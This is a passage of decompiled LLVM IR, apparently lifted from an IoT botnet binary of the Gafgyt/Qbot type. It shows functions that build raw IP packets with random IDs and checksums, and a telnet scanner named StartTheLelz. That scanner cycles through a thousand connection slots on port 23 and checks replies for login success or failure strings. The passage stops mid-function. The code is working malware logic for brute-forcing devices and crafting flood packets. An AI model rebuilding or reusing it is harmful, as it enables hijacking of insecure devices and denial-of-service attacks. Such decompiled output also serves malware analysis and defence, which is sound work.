  %v3_804cc90 = load i32, i32* %v2_804cc90, align 4
  %v2_804cca5 = call i32 @htons(i16 20)
  %v1_804ccbe = call i32 @malloc(i32 32)
  store i32 %v1_804ccbe, i32* %ecx.global-to-local, align 4
  %v2_804ccce = inttoptr i32 %v1_804ccbe to i32*
  store i32 %v3_804cc87, i32* %v2_804ccce, align 4
  %v1_804ccd3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ccd3 = add i32 %v1_804ccd3, 4
  %v3_804ccd3 = inttoptr i32 %v2_804ccd3 to i32*
  store i32 %v3_804cc90, i32* %v3_804ccd3, align 4
  %v1_804ccd9 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ccd9 = add i32 %v1_804ccd9, 8
  %v3_804ccd9 = inttoptr i32 %v2_804ccd9 to i32*
  store i32 0, i32* %v3_804ccd9, align 4
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  %v1_804cce2 = add i32 %v1_804ccbe, 12
  store i32 %v1_804cce2, i32* %edx.global-to-local, align 4
  %v1_804cce5 = inttoptr i32 %tmp2 to i32*
  %v2_804cce5 = load i32, i32* %v1_804cce5, align 4
  %v2_804cce7 = inttoptr i32 %v1_804cce2 to i32*
  store i32 %v2_804cce5, i32* %v2_804cce7, align 4
  %v0_804cce9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cce9 = add i32 %v0_804cce9, 4
  %v2_804cce9 = inttoptr i32 %v1_804cce9 to i32*
  %v3_804cce9 = load i32, i32* %v2_804cce9, align 4
  %v1_804ccec = load i32, i32* %edx.global-to-local, align 4
  %v2_804ccec = add i32 %v1_804ccec, 4
  %v3_804ccec = inttoptr i32 %v2_804ccec to i32*
  store i32 %v3_804cce9, i32* %v3_804ccec, align 4
  %v0_804ccef = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ccef = add i32 %v0_804ccef, 8
  %v2_804ccef = inttoptr i32 %v1_804ccef to i32*
  %v3_804ccef = load i32, i32* %v2_804ccef, align 4
  %v1_804ccf2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ccf2 = add i32 %v1_804ccf2, 8
  %v3_804ccf2 = inttoptr i32 %v2_804ccf2 to i32*
  store i32 %v3_804ccef, i32* %v3_804ccf2, align 4
  %v0_804ccf5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ccf5 = add i32 %v0_804ccf5, 12
  %v2_804ccf5 = inttoptr i32 %v1_804ccf5 to i32*
  %v3_804ccf5 = load i32, i32* %v2_804ccf5, align 4
  %v1_804ccf8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ccf8 = add i32 %v1_804ccf8, 12
  %v3_804ccf8 = inttoptr i32 %v2_804ccf8 to i32*
  store i32 %v3_804ccf5, i32* %v3_804ccf8, align 4
  %v0_804ccfb = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ccfb = add i32 %v0_804ccfb, 16
  %v2_804ccfb = inttoptr i32 %v1_804ccfb to i32*
  %v3_804ccfb = load i32, i32* %v2_804ccfb, align 4
  %v1_804ccfe = load i32, i32* %edx.global-to-local, align 4
  %v2_804ccfe = add i32 %v1_804ccfe, 16
  %v3_804ccfe = inttoptr i32 %v2_804ccfe to i32*
  store i32 %v3_804ccfb, i32* %v3_804ccfe, align 4
  %v2_804cd0e = inttoptr i32 %v1_804ccbe to i16*
  %v3_804cd0e = call i32 @csum(i16* %v2_804cd0e, i32 32)
  %v1_804cd13 = urem i32 %v3_804cd0e, 65536
  %v1_804cd20 = call i32 @free(i32 %v1_804ccbe)
  %v2_804cd29 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cd29, i32* @ebp, align 4
  ret i32 %v1_804cd13

; uselistorder directives
  uselistorder i32 %v1_804ccbe, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cd2b = load i32, i32* @ebp, align 4
  store i32 %v0_804cd2b, i32* %stack_var_-4, align 4
  %v4_804cd31 = sext i8 %tmp8 to i32
  %v4_804cd37 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804cd52 = add i32 %v4_804cd37, 1
  %v2_804cd52 = inttoptr i32 %v1_804cd52 to i8*
  store i8 0, i8* %v2_804cd52, align 1
  %v1_804cd5c = add i32 %tmp5, 20
  %v1_804cd65 = trunc i32 %v1_804cd5c to i16
  %v3_804cd65 = add i32 %v4_804cd37, 2
  %v4_804cd65 = inttoptr i32 %v3_804cd65 to i16*
  store i16 %v1_804cd65, i16* %v4_804cd65, align 2
  %v2_804cd69 = call i32 @rand_cmwc(i32 %v4_804cd31)
  %v1_804cd74 = trunc i32 %v2_804cd69 to i16
  %v3_804cd74 = add i32 %v4_804cd37, 4
  %v4_804cd74 = inttoptr i32 %v3_804cd74 to i16*
  store i16 %v1_804cd74, i16* %v4_804cd74, align 2
  %v1_804cd7b = add i32 %v4_804cd37, 6
  %v2_804cd7b = inttoptr i32 %v1_804cd7b to i16*
  store i16 0, i16* %v2_804cd7b, align 2
  %v1_804cd84 = add i32 %v4_804cd37, 8
  %v2_804cd84 = inttoptr i32 %v1_804cd84 to i8*
  store i8 -1, i8* %v2_804cd84, align 1
  %v3_804cd8f = add i32 %v4_804cd37, 9
  %v4_804cd8f = inttoptr i32 %v3_804cd8f to i8*
  store i8 %tmp8, i8* %v4_804cd8f, align 1
  %v1_804cd95 = add i32 %v4_804cd37, 10
  %v2_804cd95 = inttoptr i32 %v1_804cd95 to i16*
  store i16 0, i16* %v2_804cd95, align 2
  %v2_804cda1 = add i32 %v4_804cd37, 12
  %v3_804cda1 = inttoptr i32 %v2_804cda1 to i32*
  %v2_804cdaa = add i32 %v4_804cd37, 16
  %v3_804cdaa = inttoptr i32 %v2_804cdaa to i32*
  store i32 %tmp, i32* %v3_804cdaa, align 4
  %v2_804cdad = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cdad, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 3, 0, 2, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804cdaf = load i32, i32* @ebp, align 4
  store i32 %v0_804cdaf, i32* %stack_var_-4, align 4
  %v4_804cdb5 = add i32 %arg1, -2
  %v9_804cdb5 = sub i32 1, %arg1
  %v10_804cdb5 = and i32 %v9_804cdb5, %arg1
  %v11_804cdb5 = icmp slt i32 %v10_804cdb5, 0
  %v12_804cdb5 = icmp eq i32 %v4_804cdb5, 0
  %v13_804cdb5 = icmp slt i32 %v4_804cdb5, 0
  %v3_804cdb9 = icmp eq i1 %v13_804cdb5, %v11_804cdb5
  %v4_804cdb9 = icmp eq i1 %v12_804cdb5, false
  %v5_804cdb9 = and i1 %v4_804cdb9, %v3_804cdb9
  br i1 %v5_804cdb9, label %dec_label_pc_804cdc4, label %dec_label_pc_804cdd6

dec_label_pc_804cdc4:                             ; preds = %entry
  %v1_804cdca = call i32 @__libc_close(i32 %arg1)
  %v2_804cdd9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cdd6

dec_label_pc_804cdd6:                             ; preds = %entry, %dec_label_pc_804cdc4
  %v2_804cdd9 = phi i32 [ %v2_804cdd9.pre, %dec_label_pc_804cdc4 ], [ %v0_804cdaf, %entry ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804cdc4 ], [ 1, %entry ]
  store i32 %v2_804cdd9, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804cdb5, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804cdd6, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_804cddb = load i32, i32* @ebp, align 4
  %v1_804cde4 = add i32 %tmp1, 4
  %v2_804cde4 = inttoptr i32 %v1_804cde4 to i32*
  %v3_804cde4 = load i32, i32* %v2_804cde4, align 4
  %v1_804cdf0 = call i32 @__GI_inet_ntoa(i32 %v3_804cde4)
  store i32 %v0_804cddb, i32* @ebp, align 4
  ret i32 %v1_804cdf0
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804cdfa = load i32, i32* @edi, align 4
  store i32 %v0_804cdfa, i32* %stack_var_-8, align 4
  %v1_804ce04 = inttoptr i32 %tmp8 to i8*
  store i32 %tmp8, i32* @edi, align 4
  %v1_804ce09 = and i32 %tmp8, -256
  %v5_804ce0b = call i8* @_memset(i8* %v1_804ce04, i32 %v1_804ce09, i32 %tmp9)
  %v4_804ce28 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp5, i32 %tmp8, i32 %tmp9)
  %v2_804ce3d = inttoptr i32 %tmp1 to i32*
  %v3_804ce3d = call i32 @contains_string(i32 %tmp8, i32* %v2_804ce3d)
  %v1_804ce42 = icmp ne i32 %v3_804ce3d, 0
  %storemerge = zext i1 %v1_804ce42 to i32
  %v2_804ce5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ce5c, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 4, 3, 0, 2, 1 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804ce86 = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_804ce8d = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_804ce9a = udiv i32 %arg1, 32
  %v1_804cea0 = urem i32 %arg1, 32
  %v0_804cea3 = load i32, i32* @ebp, align 4
  %v2_804cea3 = mul nuw nsw i32 %v2_804ce9a, 4
  %v3_804cea3 = add nsw i32 %v2_804cea3, -140
  %v4_804cea3 = add i32 %v3_804cea3, %v0_804cea3
  %v5_804cea3 = inttoptr i32 %v4_804cea3 to i32*
  %v6_804cea3 = load i32, i32* %v5_804cea3, align 4
  %v9_804cea3 = shl i32 1, %v1_804cea0
  %v12_804cea3 = or i32 %v6_804cea3, %v9_804cea3
  store i32 %v12_804cea3, i32* %v5_804cea3, align 4
  %v1_804ceae = add i32 %arg1, 1
  %v4_804ceb5 = ptrtoint i32* %stack_var_-152 to i32
  %v5_804ced6 = call i32 @__libc_select(i32 %v1_804ceae, i32 %v2_804ce86, i32 0, i32 0, i32 %v4_804ceb5)
  %tmp19 = icmp slt i32 %v5_804ced6, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_804ceeb, label %dec_label_pc_804cf12

dec_label_pc_804ceeb:                             ; preds = %entry
  %v4_804cf07 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_804cf12

dec_label_pc_804cf12:                             ; preds = %entry, %dec_label_pc_804ceeb
  %storemerge = phi i32 [ %v4_804cf07, %dec_label_pc_804ceeb ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804cf12, { 1, 0 }
}

define i32 @contains_success() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cf21 = load i32, i32* @ebp, align 4
  store i32 %v0_804cf21, i32* %stack_var_-4, align 4
  %v4_804cf21 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cf21, i32* @ebp, align 4
  %v4_804cf35 = call i32 @contains_string(i32 %tmp, i32* bitcast ([4 x i8*]* @global_var_805f160.237 to i32*))
  %v2_804cf3a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cf3a, i32* @ebp, align 4
  ret i32 %v4_804cf35

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cf3c = load i32, i32* @ebp, align 4
  store i32 %v0_804cf3c, i32* %stack_var_-4, align 4
  %v4_804cf3c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cf3c, i32* @ebp, align 4
  %v4_804cf50 = call i32 @contains_string(i32 %tmp, i32* bitcast ([7 x i8*]* @global_var_805f140.245 to i32*))
  %v2_804cf55 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cf55, i32* @ebp, align 4
  ret i32 %v4_804cf50

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804cf57 = load i32, i32* @ebp, align 4
  store i32 %v0_804cf57, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cf72

dec_label_pc_804cf72:                             ; preds = %dec_label_pc_804cf72, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_804cf72, %dec_label_pc_804cf72 ]
  %v4_804cf72 = add i32 %stack_var_-12.0, 1
  %v2_804cf78 = mul i32 %v4_804cf72, 4
  %v5_804cf7b = add i32 %v2_804cf78, %tmp5
  %v1_804cf7e = inttoptr i32 %v5_804cf7b to i32*
  %v2_804cf7e = load i32, i32* %v1_804cf7e, align 4
  %v1_804cf80 = icmp eq i32 %v2_804cf7e, 0
  %v1_804cf82 = icmp eq i1 %v1_804cf80, false
  br i1 %v1_804cf82, label %dec_label_pc_804cf72, label %dec_label_pc_804cfb7.preheader

dec_label_pc_804cfb7.preheader:                   ; preds = %dec_label_pc_804cf72
  %v2_804cfa2 = inttoptr i32 %arg1 to i8*
  %v5_804cfbd17 = icmp sgt i32 %v4_804cf72, 0
  br i1 %v5_804cfbd17, label %dec_label_pc_804cf8d, label %dec_label_pc_804cfc6

dec_label_pc_804cf8d:                             ; preds = %dec_label_pc_804cfb7.preheader, %dec_label_pc_804cfb4
  %storemerge118 = phi i32 [ %v4_804cfb4, %dec_label_pc_804cfb4 ], [ 0, %dec_label_pc_804cfb7.preheader ]
  %v2_804cf90 = mul i32 %storemerge118, 4
  %v5_804cf93 = add i32 %v2_804cf90, %tmp5
  %v1_804cf96 = inttoptr i32 %v5_804cf93 to i32*
  %v2_804cf96 = load i32, i32* %v1_804cf96, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_804cfa2 = call i32 @strcasestr(i8* %v2_804cfa2, i32 %v2_804cf96)
  %v1_804cfa7 = icmp eq i32 %v3_804cfa2, 0
  br i1 %v1_804cfa7, label %dec_label_pc_804cfb4, label %dec_label_pc_804cfc6

dec_label_pc_804cfb4:                             ; preds = %dec_label_pc_804cf8d
  %v4_804cfb4 = add nuw nsw i32 %storemerge118, 1
  %v5_804cfbd = icmp slt i32 %v4_804cfb4, %v4_804cf72
  br i1 %v5_804cfbd, label %dec_label_pc_804cf8d, label %dec_label_pc_804cfc6

dec_label_pc_804cfc6:                             ; preds = %dec_label_pc_804cf8d, %dec_label_pc_804cfb4, %dec_label_pc_804cfb7.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_804cfb7.preheader ], [ 0, %dec_label_pc_804cfb4 ], [ 1, %dec_label_pc_804cf8d ]
  %v2_804cfc9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cfc9, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804cfb4, { 1, 0 }
  uselistorder i32 %storemerge118, { 1, 0 }
  uselistorder i32 %v4_804cf72, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804cfc6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cf8d, { 1, 0 }
}

define i32 @StartTheLelz(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  store i32 1000, i32* %eax.global-to-local, align 4
  %v2_804cff2 = call i32 @__GI_time(i32* null)
  store i32 %v2_804cff2, i32* %eax.global-to-local, align 4
  store i32 %v2_804cff2, i32* @ebx, align 4
  %v1_804cff9 = call i32 @rand_cmwc(i32 0)
  %v1_804cffe = load i32, i32* @ebx, align 4
  %v2_804cffe = xor i32 %v1_804cffe, %v1_804cff9
  store i32 %v2_804cffe, i32* @eax, align 4
  %v1_804d003 = call i32 @srand(i32 %v2_804cffe)
  store i32 %v1_804d003, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-608, align 4
  %v2_804d018 = call i32 @htons(i16 23)
  %v2_804d027 = ptrtoint i32* %stack_var_-608 to i32
  %v15_804d02d = ptrtoint i32* %stack_var_-600 to i32
  store i32 %v15_804d02d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-600, align 4
  %v1_804d044 = call i32 @malloc(i32 1025)
  store i32 %v1_804d044, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804d065 = inttoptr i32 %v1_804d044 to i8*
  %v4_804d065 = call i32 @__GI_memset(i8* %v3_804d065, i32 0, i32 1025)
  %v0_804d089 = load i32, i32* @esp, align 4
  %v1_804d09b = add i32 %v0_804d089, -27981
  %v2_804d09e = and i32 %v1_804d09b, -16
  store i32 5000, i32* %edx.global-to-local, align 4
  %v1_804d0c1 = inttoptr i32 %v2_804d09e to i8*
  store i32 %v2_804d09e, i32* @edi, align 4
  %v1_804d0c6 = and i32 %v1_804d09b, -256
  store i32 %v1_804d0c6, i32* %eax.global-to-local, align 4
  %v5_804d0c8 = call i8* @_memset(i8* %v1_804d0c1, i32 %v1_804d0c6, i32 5000)
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804d127 = or i32 %v2_804d09e, 9
  br label %dec_label_pc_804d0d3

dec_label_pc_804d0d3:                             ; preds = %entry, %dec_label_pc_804d0d3
  %storemerge245 = phi i32 [ 0, %entry ], [ %v4_804d14c, %dec_label_pc_804d0d3 ]
  %v2_804d0e7 = mul nuw nsw i32 %storemerge245, 28
  %v2_804d0e9 = add i32 %v2_804d0e7, %v2_804d09e
  store i32 %v2_804d0e9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d0f1 = inttoptr i32 %v2_804d0e9 to i32*
  store i32 0, i32* %v2_804d0f1, align 4
  %v0_804d0f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d0f3 = add i32 %v0_804d0f3, 4
  store i32 %v1_804d0f3, i32* %eax.global-to-local, align 4
  %v0_804d0f6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d0f6 = inttoptr i32 %v1_804d0f3 to i32*
  store i32 %v0_804d0f6, i32* %v2_804d0f6, align 4
  %v0_804d0f8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d0f8 = add i32 %v0_804d0f8, 4
  store i32 %v1_804d0f8, i32* %eax.global-to-local, align 4
  %v0_804d0fb = load i32, i32* %edx.global-to-local, align 4
  %v2_804d0fb = inttoptr i32 %v1_804d0f8 to i32*
  store i32 %v0_804d0fb, i32* %v2_804d0fb, align 4
  %v0_804d0fd = load i32, i32* %eax.global-to-local, align 4
  %v1_804d0fd = add i32 %v0_804d0fd, 4
  store i32 %v1_804d0fd, i32* %eax.global-to-local, align 4
  %v0_804d100 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d100 = inttoptr i32 %v1_804d0fd to i32*
  store i32 %v0_804d100, i32* %v2_804d100, align 4
  %v0_804d102 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d102 = add i32 %v0_804d102, 4
  store i32 %v1_804d102, i32* %eax.global-to-local, align 4
  %v0_804d105 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d105 = inttoptr i32 %v1_804d102 to i32*
  store i32 %v0_804d105, i32* %v2_804d105, align 4
  %v0_804d107 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d107 = add i32 %v0_804d107, 4
  store i32 %v1_804d107, i32* %eax.global-to-local, align 4
  %v0_804d10a = load i32, i32* %edx.global-to-local, align 4
  %v2_804d10a = inttoptr i32 %v1_804d107 to i32*
  store i32 %v0_804d10a, i32* %v2_804d10a, align 4
  %v0_804d10c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d10c = add i32 %v0_804d10c, 4
  %v0_804d10f = load i32, i32* %edx.global-to-local, align 4
  %v2_804d10f = inttoptr i32 %v1_804d10c to i32*
  store i32 %v0_804d10f, i32* %v2_804d10f, align 4
  %v3_804d127 = add i32 %v2_804d127, %v2_804d0e7
  %v4_804d127 = inttoptr i32 %v3_804d127 to i8*
  store i8 1, i8* %v4_804d127, align 1
  %v1_804d144 = add i32 %v2_804d0e9, 24
  store i32 %v1_804d144, i32* %edx.global-to-local, align 4
  %v2_804d14a = inttoptr i32 %v1_804d144 to i32*
  store i32 %v1_804d044, i32* %v2_804d14a, align 4
  %v4_804d14c = add nuw nsw i32 %storemerge245, 1
  store i32 %v4_804d14c, i32* %eax.global-to-local, align 4
  %v15_804d152 = icmp eq i32 %v4_804d14c, 1000
  br i1 %v15_804d152, label %dec_label_pc_804d15b.preheader, label %dec_label_pc_804d0d3

dec_label_pc_804d15b.preheader:                   ; preds = %dec_label_pc_804d0d3
  %v2_804d5d9 = ptrtoint i32* %stack_var_-320 to i32
  %tmp38 = bitcast i32* %stack_var_-320 to i8*
  %v2_804d659 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804d6bf = ptrtoint i32* %stack_var_-332 to i32
  %v2_804d6c9 = ptrtoint i32* %stack_var_-336 to i32
  %v2_804d1cb = or i32 %v2_804d09e, 8
  %v2_804d2fc = or i32 %v2_804d09e, 11
  %v2_804d343 = or i32 %v2_804d09e, 10
  %v2_804df12 = add i32 %v2_804d09e, 16
  br label %dec_label_pc_804d15b

dec_label_pc_804d15b:                             ; preds = %dec_label_pc_804e319, %dec_label_pc_804d15b.preheader
  %stack_var_-624.0 = phi i32 [ %tmp5, %dec_label_pc_804d15b.preheader ], [ %stack_var_-624.1, %dec_label_pc_804e319 ]
  %stack_var_-628.0 = phi i32 [ %tmp4, %dec_label_pc_804d15b.preheader ], [ %stack_var_-628.1, %dec_label_pc_804e319 ]
  br label %dec_label_pc_804d167

dec_label_pc_804d167:                             ; preds = %dec_label_pc_804d15b, %dec_label_pc_804e319
  %storemerge = phi i32 [ 0, %dec_label_pc_804d15b ], [ %v4_804e319, %dec_label_pc_804e319 ]
  %storemerge43 = phi i32 [ 0, %dec_label_pc_804d15b ], [ %v4_804e319, %dec_label_pc_804e319 ]
  %stack_var_-628.242 = phi i32 [ %stack_var_-628.0, %dec_label_pc_804d15b ], [ %stack_var_-628.1, %dec_label_pc_804e319 ]
  %stack_var_-624.241 = phi i32 [ %stack_var_-624.0, %dec_label_pc_804d15b ], [ %stack_var_-624.1, %dec_label_pc_804e319 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804d16d = mul nuw nsw i32 %storemerge43, 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  %v2_804d17b = mul nuw nsw i32 %storemerge43, 28
  %v2_804d17d = add i32 %v2_804d17b, %v2_804d09e
  %v1_804d17f = add i32 %v2_804d17d, 16
  store i32 %v1_804d17f, i32* %eax.global-to-local, align 4
  %v1_804d182 = inttoptr i32 %v1_804d17f to i32*
  %v2_804d182 = load i32, i32* %v1_804d182, align 4
  store i32 %v2_804d182, i32* %eax.global-to-local, align 4
  %v1_804d184 = icmp eq i32 %v2_804d182, 0
  %v1_804d186 = icmp eq i1 %v1_804d184, false
  br i1 %v1_804d186, label %dec_label_pc_804d1b5, label %dec_label_pc_804d188

dec_label_pc_804d188:                             ; preds = %dec_label_pc_804d167
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804d18b = load i32, i32* @esp, align 4
  %v1_804d18b = inttoptr i32 %v0_804d18b to i32*
  store i32 0, i32* %v1_804d18b, align 4
  %v1_804d192 = inttoptr i32 %storemerge43 to i32*
  %v2_804d192 = call i32 @__GI_time(i32* %v1_804d192)
  store i32 %v2_804d192, i32* @esi, align 4
  %v0_804d19c = load i32, i32* @ebx, align 4
  %v1_804d19e = mul i32 %v0_804d19c, 4
  store i32 %v1_804d19e, i32* %edx.global-to-local, align 4
  %v2_804d1ac = mul i32 %v0_804d19c, 28
  %v2_804d1ae = add i32 %v2_804d1ac, %v2_804d09e
  %v1_804d1b0 = add i32 %v2_804d1ae, 16
  store i32 %v1_804d1b0, i32* %eax.global-to-local, align 4
  %v2_804d1b3 = inttoptr i32 %v1_804d1b0 to i32*
  store i32 %v2_804d192, i32* %v2_804d1b3, align 4
  br label %dec_label_pc_804d1b5

dec_label_pc_804d1b5:                             ; preds = %dec_label_pc_804d167, %dec_label_pc_804d188
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d1cb = add i32 %v2_804d1cb, %v2_804d17b
  %v4_804d1cb = inttoptr i32 %v3_804d1cb to i8*
  %v5_804d1cb = load i8, i8* %v4_804d1cb, align 4
  %v6_804d1cb = zext i8 %v5_804d1cb to i32
  store i32 %v6_804d1cb, i32* %eax.global-to-local, align 4
  store i32 %v6_804d1cb, i32* @edi, align 4
  %v1_804d1ec = mul nuw nsw i32 %v6_804d1cb, 4
  %v2_804d1ec = add nuw nsw i32 %v1_804d1ec, 134585704
  %v3_804d1ec = inttoptr i32 %v2_804d1ec to i32*
  %v4_804d1ec = load i32, i32* %v3_804d1ec, align 4
  store i32 %v4_804d1ec, i32* %eax.global-to-local, align 4
  switch i8 %v5_804d1cb, label %dec_label_pc_804e319 [
    i8 0, label %dec_label_pc_804d1f5
    i8 1, label %dec_label_pc_804d5cf
    i8 2, label %dec_label_pc_804d943
    i8 3, label %dec_label_pc_804da78
    i8 4, label %dec_label_pc_804dbe7
    i8 5, label %dec_label_pc_804dd1c
    i8 6, label %dec_label_pc_804de8b
    i8 7, label %dec_label_pc_804e1b2
  ]

dec_label_pc_804d1f5:                             ; preds = %dec_label_pc_804d1b5
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804d20b = add i32 %v2_804d127, %v2_804d17b
  %v4_804d20b = inttoptr i32 %v3_804d20b to i8*
  %v5_804d20b = load i8, i8* %v4_804d20b, align 1
  %v10_804d210 = icmp eq i8 %v5_804d20b, 1
  %v1_804d212 = icmp eq i1 %v10_804d210, false
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804d212, label %dec_label_pc_804d2c1, label %dec_label_pc_804d218

dec_label_pc_804d218:                             ; preds = %dec_label_pc_804d1f5
  %v1_804d230 = add i32 %v2_804d17d, 24
  store i32 %v1_804d230, i32* %eax.global-to-local, align 4
  %v1_804d233 = inttoptr i32 %v1_804d230 to i32*
  %v2_804d233 = load i32, i32* %v1_804d233, align 4
  store i32 %v2_804d17d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d256 = inttoptr i32 %v2_804d17d to i32*
  store i32 0, i32* %v2_804d256, align 4
  %v0_804d258 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d258 = add i32 %v0_804d258, 4
  store i32 %v1_804d258, i32* %eax.global-to-local, align 4
  %v0_804d25b = load i32, i32* %edx.global-to-local, align 4
  %v2_804d25b = inttoptr i32 %v1_804d258 to i32*
  store i32 %v0_804d25b, i32* %v2_804d25b, align 4
  %v0_804d25d = load i32, i32* %eax.global-to-local, align 4
  %v1_804d25d = add i32 %v0_804d25d, 4
  store i32 %v1_804d25d, i32* %eax.global-to-local, align 4
  %v0_804d260 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d260 = inttoptr i32 %v1_804d25d to i32*
  store i32 %v0_804d260, i32* %v2_804d260, align 4
  %v0_804d262 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d262 = add i32 %v0_804d262, 4
  store i32 %v1_804d262, i32* %eax.global-to-local, align 4
  %v0_804d265 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d265 = inttoptr i32 %v1_804d262 to i32*
  store i32 %v0_804d265, i32* %v2_804d265, align 4
  %v0_804d267 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d267 = add i32 %v0_804d267, 4
